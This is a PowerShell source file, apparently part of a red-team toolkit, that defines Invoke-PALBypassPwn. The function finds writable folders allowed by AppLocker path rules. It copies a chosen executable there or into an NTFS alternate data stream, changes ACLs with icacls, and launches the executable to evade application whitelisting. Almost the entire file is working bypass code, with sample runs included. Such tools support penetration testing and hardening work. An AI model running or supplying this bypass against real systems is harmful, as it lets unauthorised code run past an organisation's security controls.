function Invoke-PALBypassPwn
{
<#
.SYNOPSIS

Gets AppLocker rules that can be exploited and executes specified binary.

Author: @oddvarmoe
License: BSD 3-Clause
Required Dependencies: ICACLS.exe, Get-PALWriteableAllowedPaths
Optional Dependencies: None

.DESCRIPTION

Gets all allowed AppLocker Paths from Get-PalWriteableAllowedPaths and places the binary you want into
an allowed path and executes.

.PARAMETER BinaryFile

The binaryfile you want to execute. Needs to be the full path: C:\folder\file.exe

.PARAMETER Type
This specifies the type of file you are trying to execute. This can either be Exe or Dll. 
Dll is currently not added 100%.

.PARAMETER Bruteforce

When this switch is used the function will try all user writeable paths until it either 
runs out of paths or it is able to execute the binary specified.   

.PARAMETER ADS

When this switch is used the function will place the binary inside an Alternate Data Stream on the user writeable folder.

.EXAMPLE

PS C:\> Invoke-PALBypassPwn -BinaryFile C:\temp\ADExplorer.exe -Type Exe

[*] Running Invoke-AppLockerBypassPwn

[*] Trying to Pwn using modifiable paths that AppLocker allows
[*] Getting modifiable paths allowed by AppLocker Path rules - Be very patient!
[+] Got the following EXE paths that are modifiable

Name Path                                                
---- ----                                                
Exe  C:\Program Files (x86)\IBM\Client Access            
Exe  C:\Windows\System32\spool\PRINTERS                  
Exe  C:\Windows\System32\spool\SERVERS                   
Exe  C:\Windows\System32\spool\drivers\color             


[*] Picking random Path to try
[+] C:\Windows\System32\spool\drivers\color was choosen

[*] Picking random filename
[+] b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe was choosen

[+] Copying binary file b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe to C:\Windows\System32\spool\drivers\color

[+] Checking ACL on C:\Windows\System32\spool\drivers\color\b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe
[+] ACL's all good on C:\Windows\System32\spool\drivers\color\b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe
[+] Trying to start binary file b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe
[+] Process launched - The world is ours!
[+] [Manual action needed] Remember to delete - C:\Windows\System32\spool\drivers\color\b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe
[+] Command added to your clipboard
Remove-item "C:\Windows\System32\spool\drivers\color\b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe"

.EXAMPLE

PS C:\> Invoke-PALBypassPwn -BinaryFile C:\temp\ADExplorer.exe -Type Exe -bruteforce -ADS

[*] Running Invoke-AppLockerBypassPwn

[*] Trying to Pwn using modifiable paths that AppLocker allows
[*] Getting modifiable paths allowed by AppLocker Path rules - Be very patient!
[+] Got the following EXE paths that are modifiable

Name Path                                                
---- ----                                                
Exe  C:\Windows\Tasks                                    
Exe  C:\Windows\tracing                                  
Exe  C:\Windows\System32\FxsTmp                          
Exe  C:\Windows\System32\Tasks                           

[+] Copying binary file 409d49b5-774a-46ff-abcd-5c166a6a9f73.exe to ADS in C:\Windows\Tasks
[+] Trying to start binary file C:\Windows\Tasks:409d49b5-774a-46ff-abcd-5c166a6a9f73.exe
                                                         
[-] Process failed to launched from C:\Windows\Tasks:409d49b5-774a-46ff-abcd-5c166a6a9f73.exe

[+] Copying binary file 3a8a14d0-eda9-44f6-b7c6-1e97aff3c8cf.exe to ADS in C:\Windows\tracing
[+] Trying to start binary file C:\Windows\tracing:3a8a14d0-eda9-44f6-b7c6-1e97aff3c8cf.exe
                                                         
[+] Process launched - The world is ours!
[-] You need to manually remove the binaries added to the streams
[+] List of commands
Remove-item "C:\Windows\Tasks" -stream 409d49b5-774a-46ff-abcd-5c166a6a9f73.exe
Remove-item "C:\Windows\tracing" -stream 3a8a14d0-eda9-44f6-b7c6-1e97aff3c8cf.exe

#>

# Function Version: 0.90

    [CmdletBinding()] Param (
        [parameter(Mandatory=$true)]
        [String]$BinaryFile,

        [ValidateSet("Exe","Dll")]
        [parameter(Mandatory=$true)]
        [String]$Type,

        [Switch]$BruteForce,

        [Switch]$ADS
    )
    Process
    {
        Try
        {
            "`n[*] Running Invoke-AppLockerBypassPwn"
            
            "`n[*] Trying to Pwn using modifiable paths that AppLocker allows"
            
            if($Type -eq "Exe")
            {
                "[*] Getting modifiable paths allowed by AppLocker Path rules - Be very patient!"
                #Needed because of bug with Global variables
                Get-PALWriteableAllowedPaths | Out-Null
                $AllowedPaths = Get-PALWriteableAllowedPaths -RuleSection Exe

                if($AllowedPaths)
                {
                    "[+] Got the following EXE paths that are modifiable"
                    $AllowedPaths

                    if($BruteForce)
                    {
                        $FilesLeftBehind = @()
                        foreach($Path in $AllowedPaths)
                        {
                            $RandomFileName = [System.Guid]::NewGuid().ToString()+".exe"
                            if($ADS)
                            {
                                "`n[+] Copying binary file $RandomFileName to ADS in $($Path.path)"
                                Get-Content $BinaryFile -Raw | set-content -path $Path.path -Stream $RandomFileName
                                Write-Verbose "$Path.path\:$randomfilename"
                                $CMDLine = "$($Path.path):$RandomFileName"
                                "[+] Trying to start binary file $CMDLine"
                                Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $CMDLine}

                                sleep 5
                                $ProcessActive = get-process | where{$_.path -eq $CMDLine} -ErrorAction SilentlyContinue
                                if($ProcessActive -eq $null)
                                {
                                    "[-] Process failed to launched from $CMDLine"
                                    $FilesLeftBehind += "Remove-item `"$($Path.Path)`" -stream $RandomFileName"
                                }
                                else
                                {
                                    "[+] Process launched - The world is ours!"
                                    "[-] You need to manually remove the binaries added to the streams"
                                    "[+] List of commands"
                                    $FilesLeftBehind += "Remove-item `"$($Path.Path)`" -stream $RandomFileName"
                                    $FilesLeftBehind
                                    break
                                }
                            }
                            else
                            {
                                # Bruteforce execution of file
                                "`n[+] Copying binary file $RandomFileName to $($Path.path)"
                                copy-item -Path $BinaryFile -Destination (join-path $($Path.Path) $RandomFileName)
                                #####"`n[+] Setting ACL using ICALCS giving Users full control of $RandomFileName"
                                #####icacls $pth"\"$tempname /grant "BUILTIN\Users:(F)" | Out-Null
                            
                                "[+] Trying to start binary file $RandomFileName"
                                Invoke-Expression "& '$(join-path $($Path.Path) $RandomFileName)'" -ErrorAction Stop
                            
                                #Check if process was launched
                                Sleep 5
                                
                                $ProcessActive = get-process | where{$_.path -eq $(join-path $Path.Path $RandomFileName)} -ErrorAction SilentlyContinue
                                if($ProcessActive -eq $null)
                                {
                                    "[-] Process failed to launched from (join-path $($Path.Path) $RandomFileName)"
                                    "[-] Removing copied binary: (join-path $($Path.Path) $RandomFileName)"
                                    remove-item (join-path $($Path.Path) $RandomFileName)
                                }
                                else
                                {
                                    "[+] Process launched - The world is ours!"
                                    "[+] [Manual action needed] Remember to delete - $(join-path $($Path.Path) $RandomFileName)"
                                    "Remove-item `"$(join-path $Path.Path $RandomFileName)`"" | clip
                                    "[+] Command added to your clipboard"
                                    "Remove-item `"$(join-path $($Path.Path) $RandomFileName)`""
                                    break
                                }
                            }
                        }
                    }
                    else # Only try one time and stop if it fails
                    {
                        $RandomPath = $AllowedPaths[(Get-Random -Minimum 0 -Maximum $AllowedPaths.Count)]
                        "`n[*] Picking random Path to try"
                        "[+] $($RandomPath.path) was choosen"
                        
                        $RandomFileName = [System.Guid]::NewGuid().ToString()+".exe"
                        "`n[*] Picking random filename"
                        "[+] $($RandomFilename) was choosen"
                        if($ADS)
                        {
                            "`n[+] Copying binary file $RandomFileName to ADS in $($RandomPath.path)"
                            Get-Content $BinaryFile -Raw | set-content -path $RandomPath.path -Stream $RandomFileName
                            Write-Verbose "$RandomPath.path\:$randomfilename"
                            $CMDLine = "$($RandomPath.path):$RandomFileName"
                            "[+] Trying to start binary file $CMDLine"
                            Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $CMDLine}

                            sleep 5
                            $ProcessActive = get-process | where{$_.path -eq $CMDLine} -ErrorAction SilentlyContinue
                            if($ProcessActive -eq $null)
                            {
                                "[-] Process failed to launched from $CMDLine"
                                "[-] You need to manually remove the binary: $CMDLine"
                                "Remove-item `"$($RandomPath.Path)`" -stream $RandomFileName" | clip
                                "[+] Command added to your clipboard"
                                "Remove-item `"$($RandomPath.Path)`" -stream $RandomFileName"
                                break
                            }
                            else
                            {
                                "[+] Process launched - The world is ours!"
                                "[-] You need to manually remove the binary: $CMDLine"
                                "Remove-item `"$($RandomPath.Path)`" -stream $RandomFileName" | clip
                                "[+] Command added to your clipboard"
                                "Remove-item `"$($RandomPath.Path)`" -stream $RandomFileName"
                                break
                            }
                        }
                        else
                        {
                            #Normal execution of file
                            "`n[+] Copying binary file $RandomFileName to $($RandomPath.Path)"
                            copy-item -Path $BinaryFile -Destination (join-path $($RandomPath.Path) $RandomFileName)
                            $JoinedPath = $($RandomPath.Path+"\"+$RandomFileName)
                            
                            $user = $env:USERNAME
                            "`n[+] Checking ACL on $JoinedPath"
                            if((get-acl -path $JoinedPath).AccessToString -match "Users.*Allow.*ReadAndExecute" -or (get-acl -path $JoinedPath).AccessToString -match "Users.*Allow.*FullControl" -or (get-acl -path $JoinedPath).AccessToString -match "$user.*Allow.*FullControl" -or (get-acl -path $JoinedPath).AccessToString -match "$user.*Allow.*ReadAndExecute")
                            {
                                "[+] ACL's all good on $JoinedPath"
                            }
                            else
                            {
                                "[+] Lackin correct ACL on $JoinedPath"
                                "[+] Setting ACL using ICALCS giving Users full control on $JoinedPath"
                                # Not possible to use Set-ACL in Constrained Language mode...Have to depend on ICACLS..that sux..
                                icacls $JoinedPath /grant "BUILTIN\Users:(F)" 
                                if($LASTEXITCODE -ne 0)
                                {
                                    "[-] Not able to change ACLs on file - Will stop execution and cleanup - Re-run function to give it another try or use the bruteforce to try until you are successfull"
                                    remove-item (join-path $RandomExePath.Path $RandomFileName)
                                    break
                                }
                            }

                            "[+] Trying to start binary file $RandomFileName"
                            invoke-expression "& '$(join-path $($RandomPath.Path) $RandomFileName)'" -ErrorAction Stop
                            
                            #Check if process was launched
                            Sleep 5
                            $ProcessActive = get-process | where{$_.path -eq $(join-path $($RandomPath.Path) $RandomFileName)} -ErrorAction SilentlyContinue
                            if($ProcessActive -eq $null)
                            {
                                "[-] Process failed to launched from $(join-path $($RandomPath.Path) $RandomFileName)"
                                "[-] Remving copied binary: $(join-path $($RandomPath.Path) $RandomFileName)"
                                remove-item $(join-path $($RandomPath.Path) $RandomFileName)
                            }
                            else
                            {
                                "[+] Process launched - The world is ours!"
                                "[+] [Manual action needed] Remember to delete - $(join-path $($RandomPath.Path) $RandomFileName)"
                                "Remove-item `"$(join-path $($RandomPath.Path) $RandomFileName)`"" | clip
                                "[+] Command added to your clipboard"
                                "Remove-item `"$(join-path $($RandomPath.Path) $RandomFileName)`""
                                break
                            }
                        }
                    }
                }
                else
                {
                    "[-] Got none EXE paths that are writable :-("
                }
            }

            if($Type -eq "Dll")
            {
                Write-error "Not implemented yet"
                break
            }
        }
        Catch
        {
            write-error $_
        }
        Finally{}
    }
}